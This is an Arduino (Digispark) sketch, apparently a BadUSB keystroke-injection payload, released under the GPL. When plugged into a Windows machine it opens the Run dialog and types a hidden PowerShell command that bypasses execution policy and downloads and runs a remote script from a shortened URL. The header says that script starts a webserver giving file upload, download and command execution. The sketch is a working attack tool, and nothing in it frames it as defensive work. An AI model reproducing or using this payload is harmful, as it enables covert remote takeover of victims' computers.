#include "DigiKeyboard.h"
/*
 * Starts a power shell webserver
 * that allows for Download, uploading, and command execution
 * Copyright Kris Occhipinti Feb 28th 2017
 * htttp://FilmsByKris.com
 * 
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 3 of the License, or
   (at your option) any later version.
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software Foundation,
   Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA

   https://www.gnu.org/licenses/gpl-3.0.txt

 */


void setup() {
  DigiKeyboard.update();
}


void loop() {
  delay(100);
  DigiKeyboard.update(); // Keeps kepboard connected
  delay(100);
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  DigiKeyboard.delay(200);

  //load powershell script from remote location
  DigiKeyboard.println("powershell -windowstyle hidden -executionpolicy bypass \"IEX (New-Object Net.WebClient).DownloadString('http://tinyurl.com/gpou37e');\"");
  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  DigiKeyboard.delay(5000);
}
